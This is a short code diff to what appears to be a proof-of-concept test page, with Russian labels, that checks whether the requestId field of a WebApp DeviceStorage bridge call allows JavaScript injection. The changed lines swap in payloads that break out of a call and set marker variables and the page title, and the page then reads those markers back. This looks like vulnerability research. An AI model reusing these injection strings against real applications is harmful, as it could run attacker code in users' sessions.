@@ -52,10 +52,10 @@ const box = document.getElementById('buttons');
 const b1=document.createElement('button');
 b1.innerHTML='<span class="step">ШАГ 1 — инъекция requestId (K1)</span><br>после клика жди ~3 сек и смотри строку "K1 result" внизу лога';
 b1.onclick=()=>{
-  raw("WebAppDeviceStorageGetKey",{requestId:'x"-window.__k1dq=1-"', key:'k'+RUN});
-  raw("WebAppDeviceStorageGetKey",{requestId:"x'-window.__k1sq=1-'", key:'k'+RUN});
-  raw("WebAppDeviceStorageGetKey",{requestId:'ok-'+RUN,            key:'k'+RUN});
-  setTimeout(()=>log("K1 result: __k1dq=", window.__k1dq, " __k1sq=", window.__k1sq), 3000);
+  raw("WebAppDeviceStorageGetKey",{requestId:");window.__k1c=1;//", key:'k'+RUN});
+  raw("WebAppDeviceStorageGetKey",{requestId:');window.__k1v=1;document.title="INJECTED-K1";//', key:'k'+RUN});
+  raw("WebAppDeviceStorageGetKey",{requestId:'ok-'+RUN, key:'k'+RUN});
+  setTimeout(()=>log("K1 result: __k1c=", window.__k1c, " __k1v=", window.__k1v, " title=", document.title), 3000);
 };
 box.appendChild(b1);
 
